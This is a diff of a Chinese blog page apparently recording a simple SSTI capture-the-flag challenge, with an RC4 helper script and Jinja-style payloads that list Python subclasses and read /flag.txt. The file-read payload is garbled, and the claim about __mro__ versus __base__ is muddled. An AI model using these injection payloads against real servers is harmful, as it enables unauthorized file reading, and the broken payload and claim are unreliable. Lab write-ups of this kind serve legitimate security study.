@@ -97,9 +97,8 @@
 <p>这是一个简单的ssti漏洞，首先我们找到了这个路由，并看到了模板渲染这么一个函数，以及一个rc4加密。然后直接使用脚本，把RC4算法给弄出来。以下是脚本:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure>
 
-<p>&#x2F;&#x2F;*<br>import base64</p>
 <p>from urllib.parse import quote</p>
-<p>defrc4_main(key&#x3D;”init_key”, message&#x3D;”init_message”):</p>
+<p>def rc4_main(key&#x3D;”init_key”, message&#x3D;”init_message”):</p>
 <pre><code># print(&quot;RC4加密主函数&quot;)
 
 s_box=rc4_init_sbox(key)
@@ -108,14 +107,14 @@ crypt=str(rc4_excrypt(message, s_box))
 
 return crypt
 </code></pre>
-<p>defrc4_init_sbox(key):</p>
+<p>def rc4_init_sbox(key):</p>
 <pre><code>s_box=list(range(256))
 
 # print(&quot;原来的 s 盒：%s&quot; % s_box)
 
 j=0
 
-foriinrange(256):
+for i in range(256):
 
 j= (j+s_box[i] +ord(key[i%len(key)])) %256
 
@@ -125,7 +124,7 @@ s_box[i], s_box[j] =s_box[j], s_box[i]
 
 return s_box
 </code></pre>
-<p>defrc4_excrypt(plain, box):</p>
+<p>def rc4_excrypt(plain, box):</p>
 <pre><code># print(&quot;调用加密程序成功。&quot;)
 
 res= []
@@ -164,6 +163,8 @@ returnstr(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)
 <p>这里直接构造payload:{{''.__class__.__mro__[2].__subclasses__()}}  这里用mro不用base的原因是，base在python3适用，Python2适用于mro</p>
 <p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-19%20190752.png" alt="2"></p>
 <p>发现这里有一个file可以利用，直接{{''.__class__.__mro__[2].__subclasses()[40].read('/flag.txt).read())__}}</p>
+<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/ssti.png" title="3"></p>
+<p>除此之外还有其他方法可以进行，不止这一种</p>
         
           <p class="article-more-link">
             <a href="/2025/09/19/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ssti/#more">Read More</a>
